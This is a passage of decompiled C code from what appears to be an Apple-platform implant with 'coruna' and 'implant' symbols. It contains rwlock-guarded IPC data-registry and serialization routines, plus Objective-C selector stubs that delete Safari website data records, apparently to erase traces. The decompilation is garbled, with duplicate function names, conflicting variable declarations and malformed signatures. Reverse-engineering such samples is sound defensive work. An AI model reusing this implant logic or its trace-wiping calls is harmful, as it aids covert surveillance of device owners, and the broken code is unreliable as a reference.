     (buf = (uint8_t *)coruna_rwlock_iface_create(&thread_attr,0x18), (int)buf == 0)) {
    base = *(long *)(thread_attr + 8);
    size = 0;
    do {
      status = *(int *)(addr_2 + size * 0x30 + 0x140);
      if (status == 0) {
fail:
        buf = (uint8_t *)0x0;
      }
      else {
        off = addr_2 + size * 0x30;
        handle = *(long *)(off + 0x148);
        if (handle == 0) {
          buf = (uint8_t *)0xad014;
          goto done;
        }
        addr = addr_2 + size * 0x30;
        err = *(int *)(addr + 0x150);
        if (err == 0 || base == 0) {
          u = 0xad014;
          if (err != 0) {
            u = 0xad001;
          }
          buf = (uint8_t *)(unsigned long)u;
          goto done;
        }
        ptr = (uint *)(addr + 0x150);
        u = *(uint *)(base + 0xe8);
        if (u != 0) {
          addr = 0;
          do {
            if (*(int *)(base + 0xf0 + addr) == status) {
              bootargs = (void *)0x0;
              scratch = 0;
              buf = (uint8_t *)coruna_ipc_resolve_entry(base,base + 0xf0 + addr,&bootargs,&scratch);
              if ((int)buf != 0) goto cleanup;
              ptr = *(void **)(off + 0x148);
              u = *ptr;
              if ((bootargs == ptr && scratch == u) ||
                 ((scratch == u &&
                  (status = _memcmp(bootargs,ptr,(unsigned long)scratch), status == 0))))
              goto fail;
              buf = &k_implant_slot_700a;
              goto cleanup;
            }
            addr = addr + 0x20;
          } while ((unsigned long)u * 0x20 - addr != 0);
        }
        if (*(uint *)(base + 0xe4) <= u) {
          buf = &k_implant_slot_7006;
          goto done;
        }
        buf = (uint8_t *)0x0;
        off = base + (unsigned long)u * 0x20;
        *(int *)(off + 0xf0) = status;
        *(uint8_t *)(off + 0xf8) = 2;
        *(long *)(off + 0x100) = handle;
        *(uint *)(off + 0x108) = *ptr;
        *(uint *)(base + 0xe8) = u + 1;
      }
cleanup:
    } while (((int)buf == 0) && (err = size < 0x17, size = size + 1, err));
    if ((int)buf == 0) {
      *handle = thread_attr;
    }
    else {
done:
      coruna_ctx_free(thread_attr);
    }
  }
  return buf;
}





uint64_t coruna_pthread_rwlock_unlock(short *arg,uint64_t val,long handle,uint64_t id_2)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((ptr = *(pthread_rwlock_t **)(arg + 4), ptr != (pthread_rwlock_t *)0x0 &&
       ((int)val != 0)) && ((handle != 0 && ((int)id_2 != 0)))))) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_implant08_via_ipc_resolve_entry(ptr,val,handle,id_2,0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_unlock(long handle,long addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_ipc_memcmp(ptr,2,addr_2,val);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint8_t * coruna_pthread_rwlock_rdlock(long handle,int flags,long addr_2,long off_3)
{
  int err;
  char *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint8_t *ptr;
  
  ptr = (uint8_t *)0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ((ptr != (pthread_rwlock_t *)0x0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
      if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
        ptr = ptr[1].__opaque;
        do {
          ptr = ptr + 0x20;
          if (*(int *)ptr == flags) {
            ptr = (uint8_t *)coruna_ipc_resolve_entry(ptr,ptr,addr_2,off_3);
            goto fail;
          }
          u = u - 1;
        } while (u != 0);
      }
      ptr = &k_implant_svc_flag_c;
fail:
      _pthread_rwlock_unlock(ptr);
    }
    else {
      ptr = (uint8_t *)0xad020;
    }
  }
  return ptr;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,long addr_2,long off_3)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = coruna_ipc_serialize(ptr,addr_2,off_3);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,void (*val,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t size;
  char *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ptr != (pthread_rwlock_t *)0x0 && arg != (void (*)0x0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      ptr = ptr[1].__opaque;
      version = 0xffffffffffffffff;
      do {
        ptr = ptr + 0x20;
        version = version + 1;
        if (*(uint *)(ptr[1].__opaque + 0x18) <= version) {
          size = 0;
          break;
        }
        u = *(uint32_t *)ptr;
        bootargs = 0;
        scratch = 0;
        size = coruna_ipc_resolve_entry(ptr,ptr,&bootargs,&scratch);
        if ((int)size != 0) break;
        size = (*arg)(handle,u,bootargs,scratch,val);
      } while ((int)size == 0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint8_t * coruna_pthread_rwlock_unlock_25548(long handle,uint64_t val,void *ctx,uint size)
{
  int err;
  void *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint8_t *ptr;
  void *buf;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  ptr = (uint8_t *)0xad001;
  if (handle != 0) {
    ptr = *(pthread_rwlock_t **)(handle + 8);
    if (((ptr != (pthread_rwlock_t *)0x0 && (uint)val != 0) && ctx != (void *)0x0) &&
        size != 0) {
      err = _pthread_rwlock_wrlock(ptr);
      if (err == 0) {
        u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
        if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
          ptr = ptr[1].__opaque + 0x38;
          do {
            if (*(uint *)(ptr + -0x18) == (uint)val) {
              ptr = _malloc((unsigned long)size);
              if (ptr == (void *)0x0) {
                ptr = (uint8_t *)0xad009;
              }
              else {
                _memcpy(ptr,ctx,(unsigned long)size);
                if (ptr[-0x10] == '\x03') {
                  buf = *(void **)(ptr + -8);
                  _bzero(buf,(unsigned long)*(uint *)ptr);
                  _free(buf);
                }
                else if (ptr[-0x10] == '\x01') {
                  _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(ptr + -8)),
                         (unsigned long)*(uint *)ptr);
                }
                ptr[-0x10] = '\x03';
                *(void **)(ptr + -8) = ptr;
                *(uint *)ptr = size;
                if (ptr[1].__sig == 0) {
                  ptr = (uint8_t *)0x0;
                }
                else {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  ptr = (uint8_t *)coruna_ipc_serialize(ptr,&bootargs,&scratch);
                  if ((int)ptr == 0) {
                    ptr = (uint8_t *)
                             (*(void (*)ptr[1].__sig)
                                       (val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque)
                    ;
                    _bzero(bootargs,(unsigned long)scratch);
                    _free(bootargs);
                  }
                }
              }
              goto fail;
            }
            ptr = ptr + 0x20;
            u = u - 1;
          } while (u != 0);
        }
        ptr = &k_implant_svc_flag_c;
fail:
        _pthread_rwlock_unlock(ptr);
      }
      else {
        ptr = (uint8_t *)0xad020;
      }
    }
  }
  return ptr;
}





uint8_t * coruna_ipc_resolve_entry(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  uint8_t *ptr;
  long handle;
  
  ptr = (uint8_t *)0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return (uint8_t *)0xad014;
      }
    }
    else {
      if (err != '\x01') {
        return &k_implant_jsc_dispatch_mask;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return (uint8_t *)0xad014;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    ptr = (uint8_t *)0x0;
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return ptr;
}





uint8_t * coruna_ipc_memcmp(long handle,int flags,int *count_2,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  int err;
  uint version;
  uint8_t *ptr;
  unsigned long port;
  long handle;
  unsigned long tag;
  int *status;
  uint *buf;
  unsigned long kind;
  uint *str;
  uint scratch;
  void *bootargs;
  
  if (((handle == 0) || (count_2 == (int *)0x0)) || (size == 0)) {
fail:
    ptr = (uint8_t *)0xad001;
  }
  else {
    if ((7 < size) && (*count_2 == -0xff24111)) {
      version = count_2[1];
      if ((version != 0) && (size = (unsigned long)version << 4 | 8, size <= size)) {
        err = *(int *)(handle + 0xe8);
        if ((uint)(*(int *)(handle + 0xe4) - err) < version) {
          return (uint8_t *)0xad009;
        }
        tag = 0;
        while (err = count_2 + tag * 4 + 2, *err != 0) {
          str = (uint *)(err + 2);
          version = *str;
          if (version < (uint)size) break;
          buf = (uint *)(count_2 + tag * 4 + 5);
          if ((*buf == 0) || (u = *buf + version, u <= version || size < u))
          break;
        }
        return &k_implant_jsc_dispatch_mask;
      }
    }
    ptr = &k_implant_slot_700b;
  }
  return ptr;
}





uint8_t * coruna_ipc_serialize(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  uint8_t *buf;
  long handle;
  unsigned long version;
  uint64_t *str;
  unsigned long port;
  uint *copy;
  uint scratch;
  void *bootargs;
  
  buf = (uint8_t *)0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    if (*(int *)(handle + 0xe8) == 0) {
      buf = &k_implant_slot_7007;
    }
    else {
      version = 0;
      port = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
      handle = handle + 0xf0;
      size = port;
      do {
        bootargs = (void *)0x0;
        scratch = 0;
        buf = (uint8_t *)coruna_ipc_resolve_entry(handle,handle,&bootargs,&scratch);
        if ((int)buf != 0) {
          return buf;
        }
        version = version + 1;
        u = (scratch + 0x1f & 0xffffffe0) + (int)size;
        size = (unsigned long)u;
        handle = handle + 0x20;
      } while (version < *(uint *)(handle + 0xe8));
      ptr = _malloc(size);
      if (ptr == (uint32_t *)0x0) {
        buf = (uint8_t *)0xad009;
      }
      else {
        _bzero(ptr,size);
        err = *(int *)(handle + 0xe8);
        *ptr = 0xf00dbeef;
        ptr[1] = err;
        if (err != 0) {
          version = 0;
          copy = ptr + 5;
          str = (uint64_t *)(handle + 0xf0);
          do {
            bootargs = (void *)0x0;
            scratch = 0;
            buf = (uint8_t *)coruna_ipc_resolve_entry(handle,str,&bootargs,&scratch);
            if ((int)buf != 0) {
              _bzero(ptr,size);
              _free(ptr);
              return buf;
            }
            copy[-1] = (uint)port;
            *copy = scratch;
            *(uint64_t *)(copy + -3) = *str;
            _memcpy((void *)((long)ptr + port),bootargs,(unsigned long)scratch);
            port = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)port);
            version = version + 1;
            copy = copy + 4;
            str = str + 4;
          } while (version < *(uint *)(handle + 0xe8));
        }
        buf = (uint8_t *)0x0;
        *val = ptr;
        *size = u;
      }
    }
  }
  return buf;
}





uint8_t * coruna_implant08_via_ipc_resolve_entry(long handle,int flags,void *ctx,uint size,int count_2)
{
  uint u;
  int err;
  void *ptr;
  long handle;
  uint8_t *ptr;
  unsigned long size;
  uint scratch;
  void *bootargs;
  
  ptr = (uint8_t *)0xad001;
  if ((((handle != 0) && (flags != 0)) && (ctx != (void *)0x0)) && (size != 0)) {
    u = *(uint *)(handle + 0xe8);
    size = (unsigned long)u;
    if (u != 0) {
      handle = 0;
      do {
        if (*(int *)(handle + 0xf0 + handle) == flags) {
          bootargs = (void *)0x0;
          scratch = 0;
          ptr = (uint8_t *)coruna_ipc_resolve_entry(handle,handle + handle + 0xf0,&bootargs,&scratch);
          if ((int)ptr != 0) {
            return ptr;
          }
          if ((bootargs != ctx || scratch != size) &&
             ((scratch != size || (err = _memcmp(bootargs,ctx,(unsigned long)size), err != 0)
              ))) {
            return &k_implant_slot_700a;
          }
          return (uint8_t *)0x0;
        }
        handle = handle + 0x20;
      } while (size * 0x20 - handle != 0);
    }
    if (u < *(uint *)(handle + 0xe4)) {
      if (count_2 == 0) {
        handle = handle + size * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 2;
        *(void **)(handle + 0x100) = ctx;
        *(uint *)(handle + 0x108) = size;
      }
      else {
        ptr = _malloc((unsigned long)size);
        if (ptr == (void *)0x0) {
          return (uint8_t *)0xad009;
        }
        _memcpy(ptr,ctx,(unsigned long)size);
        handle = handle + size * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 3;
        *(void **)(handle + 0x100) = ptr;
        *(uint *)(handle + 0x108) = size;
        u = *(uint *)(handle + 0xe8);
      }
      ptr = (uint8_t *)0x0;
      *(uint *)(handle + 0xe8) = u + 1;
    }
    else {
      ptr = &k_implant_slot_7006;
    }
  }
  return ptr;
}





uint64_t coruna_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr == (pthread_rwlock_t *)0x0) {
      u = 0xad009;
    }
    else {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        u = 0;
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
        u = 0xad020;
      }
    }
  }
  return u;
}





void coruna_sel_urlwithstring(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_URLWithString__0002c000);
  return;
}





void coruna_sel_allprofileidentifiers(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_allProfileIdentifiers_0002c008);
  return;
}





void coruna_sel_deletesafariwebsitedatarecord(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_deleteSafariWebsiteDataRecord_co_0002c010);
  return;
}





void coruna_sel_ephemeraltabgroupmanager(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_ephemeralTabGroupManager_0002c018);
  return;
}





void coruna_sel_host(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_host_0002c020);
  return;
}





void coruna_sel_stringwithcstring_encoding(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_stringWithCString_encoding__0002c028);
  return;
}





void coruna_sel_websitedatarecordwithdomain(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_websiteDataRecordWithDomain__0002c030);
  return;
}





void coruna_sel_websitedatarecordwithdomain_profile(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_websiteDataRecordWithDomain_prof_0002c038);
  return;
}

